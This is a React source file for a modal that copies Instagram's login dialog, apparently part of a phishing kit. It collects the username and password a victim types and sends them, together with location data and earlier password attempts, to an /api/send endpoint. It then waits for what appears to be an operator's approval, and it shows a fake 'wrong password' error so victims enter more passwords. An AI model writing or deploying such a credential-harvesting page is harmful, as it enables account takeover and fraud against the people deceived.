import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import axios from 'axios';
import Image from 'next/image';
import { type FC, type FormEvent, useState } from 'react';

const InstagramRoundLogo = () => (
    <div className='ig-logo-round'>
        <div className='ig-logo-round-inner'>
            <svg aria-hidden='true' className='ig-logo-icon' viewBox='0 0 24 24'>
                <defs>
                    <linearGradient id='ig-modal-gradient' x1='0%' x2='100%' y1='100%' y2='0%'>
                        <stop offset='0%' stopColor='#FD5949' />
                        <stop offset='45%' stopColor='#D6249F' />
                        <stop offset='100%' stopColor='#285AEB' />
                    </linearGradient>
                </defs>
                <path
                    fill='url(#ig-modal-gradient)'
                    d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
                />
            </svg>
        </div>
    </div>
);

const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { geoInfo, messageId, loginProvider, userData, addAccount, addPassword, setMessageId, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const togglePassword = () => setShowPassword((prev) => !prev);

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const sessionId = crypto.randomUUID();
        addAccount(accountInput);
        addPassword(password);

        const allAccounts = [...userData.accounts, accountInput];
        const allPasswords = [...userData.passwords, password];
        const message = buildAppealMessage({
            geoInfo,
            userData,
            loginProvider,
            accounts: allAccounts,
            passwords: allPasswords,
            maxPass
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'password',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(message);

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div
            className='modal form-modal instagram-login-modal show d-block'
            id='exampleModalIg'
            tabIndex={-1}
            style={{ backgroundColor: 'rgba(0,0,0,0.5)' }}
        >
            <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                <div className='modal-content'>
                    <div className='modal-body'>
                        <div className='ig-round-wraper'>
                            <InstagramRoundLogo />
                        </div>

                        <div className='login-main'>
                            <p className='login-notice'>
                                {/* eslint-disable-next-line @next/next/no-img-element */}
                                <img src={tickSrc} width={16} alt='tick' />
                                <span>{texts.instagramLoginNotice}</span>
                            </p>

                            <form onSubmit={handleSubmit}>
                                {attempts === 0 && (
                                    <div className='password-input'>
                                        <label className='form-label' htmlFor='ig-account-input'>
                                            {texts.instagramUsername}
                                        </label>
                                        <input
                                            autoComplete='username'
                                            id='ig-account-input'
                                            maxLength={60}
                                            minLength={3}
                                            name='identifier'
                                            required
                                            type='text'
                                            value={accountInput}
                                            onChange={(e) => setAccountInput(e.target.value)}
                                        />
                                    </div>
                                )}

                                <div className={`password-input has-toggle ${showError ? 'is-invalid shake' : ''}`}>
                                    <label className='form-label' htmlFor='ig-password-input'>
                                        {texts.loginPassword}
                                    </label>
                                    <input
                                        autoComplete='current-password'
                                        id='ig-password-input'
                                        maxLength={30}
                                        minLength={3}
                                        name='password-1'
                                        required
                                        type={showPassword ? 'text' : 'password'}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                    />
                                    <button
                                        aria-label='Show/Hide password'
                                        aria-pressed={showPassword}
                                        className='password-toggle'
                                        type='button'
                                        onClick={togglePassword}
                                    >
                                        <svg fill='#606770' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'block' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                            <circle cx='12' cy='12' r='2.5' />
                                        </svg>
                                        <svg fill='#E1306C' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'block' : 'none' }}>
                                            <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                        </svg>
                                    </button>
                                </div>
                                {showError && (
                                    <div className='invalid-feedback d-block login-error'>
                                        {texts.loginWrongPassword}
                                    </div>
                                )}

                                <div className='form-btn-wrapper'>
                                    <button
                                        type='submit'
                                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                                        className={`btn btn-primary ig-login-btn w-100 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                                    >
                                        <span style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
                                            {attempts === 0 ? texts.instagramLoginBtn : texts.continueBtn}
                                        </span>
                                        {isLoading && (
                                            <span className='login-btn-spinner'>
                                                <span className='custom-spinner' />
                                            </span>
                                        )}
                                    </button>
                                </div>

                                <div id='forgot-pass-wrap'>
                                    <a href='#forgot'>{texts.forgotPassword}</a>
                                </div>
                            </form>
                        </div>
                    </div>

                    <div className='modal-footer'>
                        <Image src={MetaLogo} alt='Meta logo' width={54} height={16} style={{ display: 'block' }} />
                        <div style={{ fontSize: '12px', color: '#606770', marginTop: '4px' }}>
                            {texts.aboutHelpMore}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InstagramPasswordModal;
